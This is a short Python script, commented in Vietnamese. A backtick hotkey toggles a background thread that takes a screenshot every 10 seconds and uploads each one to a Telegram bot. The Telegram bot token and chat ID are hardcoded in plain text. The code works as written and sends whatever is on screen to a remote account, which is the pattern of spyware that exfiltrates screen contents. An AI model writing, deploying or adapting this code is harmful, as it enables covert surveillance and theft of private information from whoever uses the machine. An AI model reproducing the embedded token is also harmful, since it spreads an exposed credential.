import os
import subprocess
import keyboard
import psutil
import time
import pyautogui
import requests
import datetime
import threading

# --- Thông tin bot ---
BOT_TOKEN = "8408463425:AAHgisahCKv1B8UGdzcLdR-9Fkf9HAAonaw"
CHAT_ID = "5994494061"

# File lưu PID ảo (trạng thái chạy)
pid_file = "bot_running.txt"

# Biến trạng thái
bot_thread = None
bot_running = False

def send_photo(photo_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    with open(photo_path, "rb") as f:
        requests.post(url, data={"chat_id": CHAT_ID}, files={"photo": f})

def bot_loop():
    """Bot chụp màn hình & gửi Telegram."""
    while bot_running:
        filename = datetime.datetime.now().strftime("%Y%m%d_%H%M%S.png")
        screenshot = pyautogui.screenshot()
        screenshot.save(filename)
        send_photo(filename)
        time.sleep(10)

def is_bot_running():
    return os.path.exists(pid_file)

def start_bot():
    global bot_thread, bot_running
    if is_bot_running():
        return
    bot_running = True
    with open(pid_file, "w") as f:
        f.write("1")
    bot_thread = threading.Thread(target=bot_loop, daemon=True)
    bot_thread.start()
    print("Bot đã bật.")

def stop_bot():
    global bot_running
    if not is_bot_running():
        return
    bot_running = False
    if os.path.exists(pid_file):
        os.remove(pid_file)
    print("Bot đã tắt.")

print("Hotkey controller đang chạy ngầm... Nhấn phím ` để bật/tắt bot.")

while True:
    if keyboard.is_pressed("`"):
        if is_bot_running():
            stop_bot()
        else:
            start_bot()
        while keyboard.is_pressed("`"):  # chờ nhả phím
            time.sleep(0.2)
    time.sleep(0.1)
